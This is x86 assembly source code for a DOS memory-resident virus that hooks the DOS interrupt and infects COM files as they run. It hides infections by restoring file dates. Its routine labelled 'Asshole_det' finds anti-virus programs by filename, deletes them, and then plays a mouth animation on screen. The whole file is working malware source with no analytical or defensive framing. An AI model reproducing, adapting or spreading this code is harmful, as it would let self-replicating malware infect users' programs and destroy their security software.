

		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h

len             equ offset last - begin
vir_len         equ len / 16d 

host:           db 0E9h, 03h, 00h, 43h, 44h, 00h         

begin:          
		
		call virus             

virus:          
		jmp after_note

note:            
		db     '[l™‡kõ„W].á.¥Œk†d‰M–$'
		db     'ÅH‹$.pâ™Gâ†m.Œ$.….{pâ™Å”-Å].ûƒâ‹†¤Å'
		db     'Åh†¥k$.Å¢.€â˜ž'

after_note:     
		pop     bp                             
		sub     bp,109h                        

fix_victim:     
		mov     di,0100h                 ; replace victims       
		lea     si,ds:[vict_head+bp]     ; first 6 bytes  
		mov     cx,06h
		rep     movsb
Is_I_runnin:    
		mov     ax,2C2Ch                   
		int     21h                      ; call to see if runnin  
		cmp     ax, 0DCDh
		je      Bye_Bye
cut_hole:  
		mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a        
		jne     abort                        
		mov     ax,ds:[0003]                 
		sub     ax,100                        
		mov     ds:0003,ax
Zopy_me:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                        
		add     ax,bx                       
		mov     es,ax
		mov     cx,len                   
		mov     ax,ds                       
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin+bp]            
		lea     di,es:0100                  
		rep     movsb                       
						    
		mov     [vir_seg+bp],es        
		mov     ax,cs                       
		mov     es,ax
Grab_21:                                     
		cli
		mov     ax,3521h                   ; hook 21
		int     21h                     
		mov     ds,[vir_seg+bp]   
		mov     ds:[old_21h-6h],bx
		mov     ds:[old_21h+2-6h],es
		mov     dx,offset Lockjaw - 6h
		mov     ax,2521h                
		int     21h                     
		sti                            
abort:          
		mov     ax,cs                      ; get the hell outa 
		mov     ds,ax                      ; dodge
		mov     es,ax
		xor     ax,ax

Bye_Bye:      
		mov     bx,0100h                   ; go to start o' victim
		jmp     bx                     

Lockjaw:         
		pushf                              ; is i checkin if     
		cmp     ax,2c2ch                   ; resident
		jne     My_21h                   
		mov     ax,0dcdh                 
		popf                                   
		iret
		
My_21h:         
		push    ds                       
		push    es                         ; save it all
		push    di
		push    si
		push    ax
		push    bx
		push    cx
		push    dx
check_exec:     
		cmp     ax,04B00h                  ; is the file being 
		jne     notforme                   ; executed
		mov     cs:[name_seg-6],ds
		mov     cs:[name_off-6],dx
		jmp     chk_com              

notforme:       
		pop     dx                         ; byebye
		pop     cx
		pop     bx
		pop     ax
		pop     si
		pop     di
		pop     es
		pop     ds
		popf
		jmp     dword ptr cs:[old_21h-6]
int21:          
		pushf                           
		call    dword ptr cs:[old_21h-6]      ; obvious eh?
		jc      notforme
		ret                           

chk_com:        cld                          
		mov     di,dx                
		push    ds
		pop     es
		mov     al,'.'                  
		repne   scasb                   
		call    pricktest                
		cmp     ax, 00ffh                ; WAS the program an AV?
		je      notforme
		cmp     word ptr es:[di],'OC'    ; is i a com?
		jne     notforme                
		cmp     word ptr es:[di+2],'M'  
		jne     notforme                     
						     
		call    Grab_24                   
		call    set_attrib
				
open_victim:      
		mov     ds,cs:[name_seg-6]   
		mov     dx,cs:[name_off-6]
		mov     ax,3D02h             
		call    int21            
		jc      close_file
		push    cs
		pop     ds
		mov     [handle-6],ax
		mov     bx,ax   

		call    get_date        
		
check_forme:    
		push    cs
		pop     ds
		mov     bx,[handle-6]        
		mov     ah,3fh
		mov     cx,06h
		lea     dx,[vict_head-6]
		call    int21
		mov     al, byte ptr [vict_head-6]     ; is the prog a exe?
		mov     ah, byte ptr [vict_head-6]+1   
		cmp     ax,[exe-6]
		je      save_date
		mov     al, byte ptr [vict_head-6]+3   ; is the prog already
		mov     ah, byte ptr [vict_head-6]+4   ; infected?
		cmp     ax,[initials-6]
		je      save_date                
						 
		
get_len:        
		mov     ax,4200h                 
		call    move_pointer
		mov     ax,4202h                 
		call    move_pointer
		sub     ax,03h                   
		mov     [len_file-6],ax
	       
		call    write_jmp
		call    write_virus                                   
						 
save_date:      
		push    cs                       
		pop     ds
		mov     bx,[handle-6]
		mov     dx,[date-6]
		mov     cx,[time-6]
		mov     ax,5701h
		call    int21

close_file:     
		mov     bx,[handle-6]
		mov     ah,03eh                    
		call    int21
		mov     dx,cs:[old_24h-6]          
		mov     ds,cs:[old_24h+2-6]
		mov     ax,2524h
		call    int21
		jmp     notforme         
new_24h:        
		mov     al,3            
		iret
pricktest:
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'XR'    ;*rx
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'PO'    ;*STOP
		jne     next1                     
		cmp     word ptr es:[di-5],'TS'   
		je      jumptoass                

next1:          cmp     word ptr es:[di-3],'VA'    ;AV  i.e. cpav
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'TO'    ;*prot  f-prot
		jne     next2                
		cmp     word ptr es:[di-5],'RP'  
		je      jumptoass                     

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan  McAffee's B.S.
		jne     next3                
		cmp     word ptr es:[di-5],'CS'  
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'NA'    ;*lean  CLEAN..
		jne     next3                      ; why not eh?
		cmp     word ptr es:[di-5],'EL'  
		je      jumptoass                     
next3:          ret                
jumptoass:      
		jmp     Asshole_det                ;Asshole Program                                      
						   ;Detected
move_pointer:   
		push    cs
		pop     ds
		mov     bx,[handle-6]
		xor     cx,cx
		xor     dx,dx
		call    int21
		ret
						
write_jmp:      
		push    cs                    
		pop     ds
		mov     ax,4200h        
		call    move_pointer
		mov     ah,40h
		mov     cx,01h
		lea     dx,[jump-6]
		call    int21
		mov     ah,40h
		mov     cx,02h
		lea     dx,[len_file-6]
		call    int21
		mov     ah,40h
		mov     cx,02h
		lea     dx,[initials-6]
		call    int21
		ret

write_virus:    
		push    cs
		pop     ds
		mov     ax,4202h       
		call    move_pointer
		mov     ah,40
		mov     cx,len      
		mov     dx,100
		call    int21      
		ret

get_date:       
		mov     ax,5700h        
		call    int21       
		push    cs
		pop     ds
		mov     [date-6],dx      
		mov     [time-6],cx
		ret
					 
Grab_24:        
		mov     ax,3524h         
		call    int21        
		mov     cs:[old_24h-6],bx
		mov     cs:[old_24h+2-6],es
		mov     dx,offset new_24h-6
		push    cs
		pop     ds
		mov     ax,2524h         
		call    int21        
		ret

set_attrib:  
		mov     ax,4300h           
		mov     ds,cs:[name_seg-6]
		mov     dx,cs:[name_off-6]
		call    int21
		and     cl,0feh                
		mov     ax,4301h
		call    int21               
		ret
Asshole_det:
		mov     ds,cs:[name_seg-6]           ; da asshole
		mov     dx,cs:[name_off-6]
		mov     ax, 4301h                    ; clear attribs
		mov     cx, 00h
		call    int21            
		mov     ah, 41h                      ; delete da bastard
		call    int21
chomp:
		push    cs                           ; da chomper
		pop     ds
		mov     ah, 03h
		int     10h
		mov     [c1-6], bh                   ; save cursor shit
		mov     [c2-6], dh 
		mov     [c3-6], dl 
		mov     [c4-6], ch 
		mov     [c5-6], cl 
		mov     ah, 1
		mov     cl, 0
		mov     ch, 40h                 
		int     10h                    
					       
		mov     cl, 0
		mov     dl, 4Fh                 
		mov     ah, 6
		mov     al, 0
		mov     bh, 0Fh
		mov     ch, 0
		mov     cl, 0
		mov     dh, 0
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 0
		mov     dl, 1Fh
		mov     bh, 0
		int     10h                    
					       
		mov     dx, offset eyes - 6          ; print the eyes
		mov     ah, 9
		mov     bl, 0Fh
		call    int21                    
					       
		mov     ah, 2
		mov     dh, 1
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DCh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 18h
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DFh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     dl, 0
chomp_1:
		mov     ah, 2
		mov     dh, 2
		int     10h                    
					       
		mov     ah, 9
		mov     al, 55h                 
		mov     bl, 0Fh
		mov     cx, 1
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 17h
		inc     dl
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0EFh
		mov     bl, 0Fh
		int     10h                    
					       
		inc     dl
		cmp     dl, 50h                 
		jl      chomp_1                  
		mov     [data_1-6], 0
chomp_3:
		mov     cx, 7FFFh                    ; delays

locloop_4:
		loop    locloop_4              

		inc     [data_1-6]
		cmp     [data_1-6], 0Ah
		jl      chomp_3                  
		mov     [data_1-6], 0
		mov     cl, 0
		mov     dl, 4Fh                 
chomp_5:
		mov     ah, 6
		mov     al, 1
		mov     bh, [data_2-6]
		mov     ch, 0Dh
		mov     dh, 18h
		int     10h                    
					       
		mov     ah, 7
		mov     al, 1
		mov     bh, [data_2-6]
		mov     ch, 0
		mov     dh, 0Ch
		int     10h                    
		mov     cx, 3FFFh                      ; delays

locloop_6:
		loop    locloop_6              
		inc     [data_1-6]
		cmp     [data_1-6], 0Bh
		jl      chomp_5                  
		mov     [data_1-6], 0
chomp_7:
		mov     cx, 7FFFh                       ; delays

locloop_8:
		loop    locloop_8              
		inc     [data_1-6]
		cmp     [data_1-6], 0Ah
		jl      chomp_7                  
		mov     ah, 6
		mov     al, 0
		mov     bh, [data_2-6]
		mov     ch, 0
		mov     cl, 0
		mov     dh, 18h
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     cl, 7
		mov     ch, 6
		int     10h                    
		
		mov     ah, 2
		mov     bh, [c1-6] 
		mov     dh, [c2-6] 
		mov     dl, [c3-6] 
		int     10h
		mov     al, bh
		mov     ah, 5
		int     10h
		mov     ah, 1
		mov     ch, [c4-6]
		mov     cl, [c5-6]
		int     10h
		mov     ax, 0003h
		int     10h                        ; sort of a cls
		mov     ax, 00ffh
		ret
					       

eyes            db      '(o)          (o)','$'
vict_head       db  090h, 0cdh, 020h, 043h, 044h, 00h      
jump            db  0E9h                                   
initials        dw  4443h                                  
exe             dw  5A4Dh
last            db  090h                                   

data_1          db      0
data_2          db      0
old_21h         dw  00h,00h
old_24h         dw  00h,00h
old_10h         dw  00h,00h
name_seg        dw  ?
name_off        dw  ?
vir_seg         dw  ?
len_file        dw  ?
handle          dw  ?
date            dw  ?
time            dw  ?
c1              db       0          
c2              db       0          
c3              db       0          
c4              db       0          
c5              db       0          

code            ends
		end host




